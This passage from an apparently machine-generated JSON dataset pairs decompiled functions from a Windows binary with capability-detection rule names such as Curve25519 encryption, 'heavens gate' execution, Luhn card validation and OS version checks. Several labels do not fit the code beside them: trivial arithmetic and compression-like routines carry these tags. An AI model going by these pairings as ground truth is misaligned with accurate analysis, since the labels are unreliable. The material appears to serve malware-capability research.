        "decompiled_code": "\nvoid __fastcall fcn.00432498(uchar *param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 3;\n    uVar1 = param_2 - 2;\n    if (uVar1 < 7) {\n        *(param_1 + 4) = 1;\n        iVar2 = 2;\n    }\n    else if (uVar1 == 7) {\n        *(param_1 + 4) = 2;\n        iVar2 = 9;\n    }\n    else {\n        *(param_1 + 4) = 0;\n        iVar2 = 0;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 187
    },
    "004324d4": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004324d4(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 10;\n    // switch table (18 cases) at 0x4324ff\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 3:\n        *(param_1 + 4) = 2;\n        iVar1 = 3;\n        break;\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 9:\n        *(param_1 + 4) = 3;\n        iVar1 = 4;\n        break;\n    case 10:\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 10;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n    case 0x11:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 333
    },
    "00432570": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432570(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x17;\n    // switch table (105 cases) at 0x4325f6\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n    case 3:\n    case 4:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 5:\n    case 6:\n    case 7:\n        *(param_1 + 4) = 2;\n        iVar1 = 5;\n        break;\n    case 8:\n    case 9:\n    case 10:\n        *(param_1 + 4) = 3;\n        iVar1 = 8;\n        break;\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 0xb;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n        break;\n    case 0x11:\n    case 0x12:\n    case 0x13:\n        *(param_1 + 4) = 6;\n        iVar1 = 0x11;\n        break;\n    case 0x14:\n    case 0x15:\n        *(param_1 + 4) = 7;\n        iVar1 = 0x14;\n        break;\n    case 0x16:\n    case 0x17:\n        *(param_1 + 4) = 8;\n        iVar1 = 0x16;\n        break;\n    case 0x18:\n    case 0x19:\n        *(param_1 + 4) = 9;\n        iVar1 = 0x18;\n        break;\n    case 0x1a:\n    case 0x1b:\n        *(param_1 + 4) = 10;\n        iVar1 = 0x1a;\n        break;\n    case 0x1c:\n    case 0x1d:\n        *(param_1 + 4) = 0xb;\n        iVar1 = 0x1c;\n        break;\n    case 0x1e:\n    case 0x1f:\n        *(param_1 + 4) = 0xc;\n        iVar1 = 0x1e;\n        break;\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n        *(param_1 + 4) = 0xd;\n        iVar1 = 0x20;\n        break;\n    case 0x24:\n    case 0x25:\n    case 0x26:\n    case 0x27:\n        *(param_1 + 4) = 0xe;\n        iVar1 = 0x24;\n        break;\n    case 0x28:\n    case 0x29:\n    case 0x2a:\n    case 0x2b:\n        *(param_1 + 4) = 0xf;\n        iVar1 = 0x28;\n        break;\n    case 0x2c:\n    case 0x2d:\n    case 0x2e:\n    case 0x2f:\n        *(param_1 + 4) = 0x10;\n        iVar1 = 0x2c;\n        break;\n    case 0x30:\n    case 0x31:\n    case 0x32:\n    case 0x33:\n        *(param_1 + 4) = 0x11;\n        iVar1 = 0x30;\n        break;\n    case 0x34:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n        *(param_1 + 4) = 0x12;\n        iVar1 = 0x34;\n        break;\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3b:\n        *(param_1 + 4) = 0x13;\n        iVar1 = 0x38;\n        break;\n    case 0x3c:\n    case 0x3d:\n    case 0x3e:\n    case 0x3f:\n        *(param_1 + 4) = 0x14;\n        iVar1 = 0x3c;\n        break;\n    case 0x40:\n    case 0x41:\n    case 0x42:\n    case 0x43:\n        *(param_1 + 4) = 0x15;\n        iVar1 = 0x40;\n        break;\n    case 0x44:\n    case 0x45:\n    case 0x46:\n    case 0x47:\n        *(param_1 + 4) = 0x16;\n        iVar1 = 0x44;\n        break;\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n    case 0x4b:\n        *(param_1 + 4) = 0x17;\n        iVar1 = 0x48;\n        break;\n    case 0x4c:\n    case 0x4d:\n    case 0x4e:\n    case 0x4f:\n        *(param_1 + 4) = 0x18;\n        iVar1 = 0x4c;\n        break;\n    case 0x50:\n    case 0x51:\n    case 0x52:\n    case 0x53:\n        *(param_1 + 4) = 0x19;\n        iVar1 = 0x50;\n        break;\n    case 0x54:\n    case 0x55:\n    case 0x56:\n    case 0x57:\n        *(param_1 + 4) = 0x1a;\n        iVar1 = 0x54;\n        break;\n    case 0x58:\n    case 0x59:\n    case 0x5a:\n    case 0x5b:\n        *(param_1 + 4) = 0x1b;\n        iVar1 = 0x58;\n        break;\n    case 0x5c:\n    case 0x5d:\n    case 0x5e:\n    case 0x5f:\n        *(param_1 + 4) = 0x1c;\n        iVar1 = 0x5c;\n        break;\n    case 0x60:\n        *(param_1 + 4) = 0x1d;\n        iVar1 = 0x60;\n        break;\n    case 0x61:\n        *(param_1 + 4) = 0x1e;\n        iVar1 = 0x61;\n        break;\n    case 0x62:\n        *(param_1 + 4) = 0x1f;\n        iVar1 = 0x62;\n        break;\n    case 99:\n        *(param_1 + 4) = 0x20;\n        iVar1 = 99;\n        break;\n    case 100:\n        *(param_1 + 4) = 0x21;\n        iVar1 = 100;\n        break;\n    case 0x65:\n        *(param_1 + 4) = 0x22;\n        iVar1 = 0x65;\n        break;\n    case 0x66:\n        *(param_1 + 4) = 0x23;\n        iVar1 = 0x66;\n        break;\n    case 0x67:\n        *(param_1 + 4) = 0x24;\n        iVar1 = 0x67;\n        break;\n    case 0x68:\n        *(param_1 + 4) = 0x25;\n        iVar1 = 0x68;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 1829
    },
    "004512b8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004512b8(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    puVar1 = *(param_2 + 8);\n    uVar2 = fcn.0040484c(puVar1[2], puVar1[1], *puVar1);\n    *(param_2 + 0xc) = uVar2 & 0x7f;\n    return;\n}\n",
        "token_count": 108
    },
    "00404aac": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404aac(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "00404f70": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid fcn.00404f70(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = param_1;\n    (*(param_2 + 5))();\n    return;\n}\n",
        "token_count": 54
    },
    "0041c584": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c584(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41c5fb;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.0040700c();\n    if (param_2 != 0) {\n        iVar2 = fcn.004164e8();\n        fcn.0040700c(iVar2 + 5);\n        cVar1 = fcn.0040f978();\n        if (cVar1 == '\\0') {\n            fcn.0040700c();\n        }\n    }\n    fcn.00416c80();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41c602;\n    uStack24 = 0x41c5fa;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 259
    },
    "0042107c": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042107c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 50
    },
    "0045bb2c": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045bb2c(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 0x14) + 0x5b) - 1U < 2) {\n        fcn.0045b9b4(&stack0xfffffffc);\n        fcn.00432228();\n        cVar1 = fcn.00432330();\n        if (cVar1 == '\\0') {\n            fcn.0045ba48(arg_8h[3] + -2, &stack0xfffffffc);\n            fcn.0045ba48(arg_8h[3] + -2, &stack0xfffffffc);\n        }\n        else {\n            fcn.0045bad0(arg_8h[3] + -2, *arg_8h + 10, &stack0xfffffffc);\n        }\n    }\n    else {\n        fcn.0045b9b4(&stack0xfffffffc);\n        fcn.00432228();\n        cVar1 = fcn.00432330();\n        if (cVar1 == '\\0') {\n            fcn.0045ba48(arg_8h[1] + 5, &stack0xfffffffc);\n            fcn.0045ba48(arg_8h[1] + 8, &stack0xfffffffc);\n        }\n        else {\n            fcn.0045bad0(arg_8h[1] + 10, (arg_8h[2] - *(in_EAX + 0x18)) + -2, &stack0xfffffffc);\n        }\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "004667d4": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004667d4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 50
    },
    "004033e0": {
        "rules": [
            "generate random numbers using the Delphi LCG/d1e3669b265a4cefae2dee380548f202"
        ],
        "decompiled_code": "\nuint fcn.004033e0(void)\n\n{\n    uint32_t in_EAX;\n    \n    *0x491008 = *0x491008 * 0x8088405 + 1;\n    return in_EAX * *0x491008 >> 0x20;\n}\n",
        "token_count": 62
    },
    "0040773c": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nulong fcn.0040773c(void)\n\n{\n    uint in_EAX;\n    \n    return CONCAT44(in_EAX, in_EAX);\n}\n",
        "token_count": 32
    },
    "00409738": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409738(ushort *arg_8h)\n\n{\n    uint32_t in_EAX;\n    ushort *in_ECX;\n    uint32_t in_EDX;\n    \n    *in_ECX = in_EAX / (in_EDX & 0xffff);\n    *arg_8h = in_EAX % (in_EDX & 0xffff);\n    return;\n}\n",
        "token_count": 86
    },
    "0048c91c": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048c91c(uint param_1, char param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack56 = 0x48c935;\n    fcn.004059cc();\n    uStack60 = 0x48c9fa;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    uStack72 = 0x48c9cd;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uVar4 = 0x104;\n    puStack56 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(0, 0x104, &fcn.0048c91c::var_ch, &fcn.0048c91c::var_10h, &fcn.0048c91c::var_14h, 0, 0x104);\n    uVar3 = 0x48c979;\n    iVar2 = sub.kernel32.dll_GetVolumeInformationA(uVar1);\n    if (iVar2 != 0) {\n        if (param_2 == '\\0') {\n            uVar3 = 0;\n            fcn.00409e5c(var_ch);\n        }\n        else {\n            fcn.0040af98(var_8h);\n            uVar3 = var_8h;\n        }\n    }\n    *in_FS_OFFSET = uVar3;\n    *in_FS_OFFSET = uVar4;\n    fcn.00405530(0x48ca01);\n    return;\n}\n",
        "token_count": 485
    },
    "00403d30": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00403d30(void)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        uVar1 = fcn.00403bcc();\n        if (uVar1 == '\\n') {\n            return;\n        }\n        if (uVar1 >> 8 == '\\x1a') break;\n        if (uVar1 == '\\r') {\n            uVar1 = fcn.00403bcc();\n            if ((uVar1 == '\\n') || (uVar1 >> 8 == '\\x1a')) {\n                return;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00406018": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00406018(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    \n    if (param_1 == 0) {\n        return;\n    }\n    cVar1 = *param_2;\n    if ((cVar1 != '\\n') && (cVar1 != '\\v')) {\n        if (cVar1 == '\\f') {\n            do {\n                *in_EAX = 0;\n                in_EAX[1] = 0;\n                in_EAX[2] = 0;\n                in_EAX[3] = 0;\n                in_EAX = in_EAX + 4;\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\r') {\n            do {\n                fcn.00406018();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405fe8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if ((cVar1 != '\\x0f') && (cVar1 != '\\x11')) {\n            if (*0x495008 != NULL) {\n                (**0x495008)();\n            }\n            fcn.00402ff8();\n            return;\n        }\n    }\n    do {\n        *in_EAX = 0;\n        in_EAX = in_EAX + 1;\n        iVar3 = param_1 + -1;\n        bVar2 = 0 < param_1;\n        param_1 = iVar3;\n    } while (iVar3 != 0 && bVar2);\n    return;\n}\n",
        "token_count": 509
    },
    "00406208": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00406208(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar6;\n    \n    puVar6 = *(param_1 + 1) + 10 + param_1;\n    iVar5 = puVar6[-1];\n    iVar4 = 0;\n    iVar2 = puVar6[-2];\n    do {\n        if (iVar4 < puVar6[1]) {\n            fcn.004030fc();\n        }\n        pcVar3 = **puVar6;\n        cVar1 = *pcVar3;\n        if (cVar1 == '\\n') {\n            fcn.00405584();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\v') {\n            fcn.00405d64();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\f') {\n            fcn.004061f0();\n            iVar4 = 0x10;\n        }\n        else if (cVar1 == '\\r') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 6);\n            fcn.00406324(iVar4, *(pcVar3 + pcVar3[1] + 2));\n        }\n        else if (cVar1 == '\\x0e') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 2);\n            fcn.00406208();\n        }\n        else if (cVar1 == '\\x0f') {\n            fcn.00407024();\n            iVar4 = 4;\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x495008 != NULL) {\n                    (**0x495008)(unaff_EDI, unaff_ESI);\n                }\n                fcn.00402ff8();\n                return;\n            }\n            fcn.00406970();\n            iVar4 = 4;\n        }\n        iVar4 = iVar4 + puVar6[1];\n        puVar6 = puVar6 + 2;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    if (iVar4 < iVar2) {\n        fcn.004030fc();\n    }\n    return;\n}\n",
        "token_count": 551
    },
    "00406324": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __thiscall fcn.00406324(char *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = *param_1;\n    if (cVar1 == '\\n') {\n        do {\n            fcn.00405584();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\v') {\n        do {\n            fcn.00405d64();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.004061f0();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.00406324();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.00406208();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.00407024();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x495008 != NULL) {\n                (**0x495008)();\n            }\n            fcn.00402ff8();\n            return;\n        }\n        do {\n            fcn.00406970();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 439
    },
    "0046b880": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b880(int32_t param_1, int32_t param_2)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iStack24;\n    uint32_t uStack20;\n    uint16_t *puStack16;\n    \n    uStack20 = 0xffffffff;\n    uVar2 = *(param_2 + 2);\n    iVar7 = 0;\n    iVar4 = 7;\n    iVar3 = 4;\n    if (uVar2 == 0) {\n        iVar4 = 0x8a;\n        iVar3 = 3;\n    }\n    *(param_2 + 6 + param_1 * 4) = 0xffff;\n    puStack16 = param_2 + 6;\n    iStack24 = 0;\n    uVar5 = uVar2;\n    if (-1 < param_1) {\n        do {\n            iVar7 = iVar7 + 1;\n            uVar6 = *puStack16;\n            if ((iVar4 <= iVar7) || (uVar6 != uVar5)) {\n                if (iVar7 < iVar3) {\n                    piVar1 = in_EAX + 0xa78 + uVar5 * 4;\n                    *piVar1 = *piVar1 + iVar7;\n                }\n                else if (uVar5 == 0) {\n                    if (iVar7 < 0xb) {\n                        *(in_EAX + 0xabc) = *(in_EAX + 0xabc) + 1;\n                    }\n                    else {\n                        *(in_EAX + 0xac0) = *(in_EAX + 0xac0) + 1;\n                    }\n                }\n                else {\n                    if (uVar5 != uStack20) {\n                        piVar1 = in_EAX + 0xa78 + uVar5 * 4;\n                        *piVar1 = *piVar1 + 1;\n                    }\n                    *(in_EAX + 0xab8) = *(in_EAX + 0xab8) + 1;\n                }\n                iVar7 = 0;\n                uStack20 = uVar5;\n                if (uVar6 == 0) {\n                    iVar4 = 0x8a;\n                    iVar3 = 3;\n                }\n                else if (uVar6 == uVar5) {\n                    iVar4 = 6;\n                    iVar3 = 3;\n                }\n                else {\n                    iVar4 = 7;\n                    iVar3 = 4;\n                }\n            }\n            iStack24 = iStack24 + 1;\n            puStack16 = puStack16 + 2;\n            uVar5 = uVar6;\n        } while (iStack24 <= param_1);\n    }\n    return;\n}\n",
        "token_count": 648
    },
    "0046b98c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b98c(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iStack48;\n    uint32_t uStack44;\n    uint16_t *puStack20;\n    \n    iVar7 = 4;\n    iVar2 = 7;\n    uStack44 = 0xffffffff;\n    if (*(param_2 + 2) == 0) {\n        iVar2 = 0x8a;\n        iVar7 = 3;\n    }\n    iStack48 = 0;\n    puStack20 = param_2 + 6;\n    iVar3 = 0;\n    uVar5 = *(param_2 + 2);\n    if (-1 < param_1) {\n        do {\n            iVar4 = iVar3 + 1;\n            uVar6 = *puStack20;\n            if ((iVar2 <= iVar4) || (uVar6 != uVar5)) {\n                if (iVar4 < iVar7) {\n                    do {\n                        uVar8 = *(in_EAX + 0xa7a + uVar5 * 4);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xa78 + uVar5 * 4);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) =\n                                 *(in_EAX + 0x16b4) | *(in_EAX + 0xa78 + uVar5 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                    } while (iVar4 != 0);\n                }\n                else if (uVar5 == 0) {\n                    if (iVar4 < 0xb) {\n                        uVar8 = *(in_EAX + 0xabe);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xabc);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xabc) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        if (*(in_EAX + 0x16b8) < 0xe) {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -3 << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar3 - 2U << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = (iVar3 - 2U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n                        }\n                    }\n                    else {\n                        uVar8 = *(in_EAX + 0xac2);\n                        if (0x10 - uVar8 < *(in_EAX + 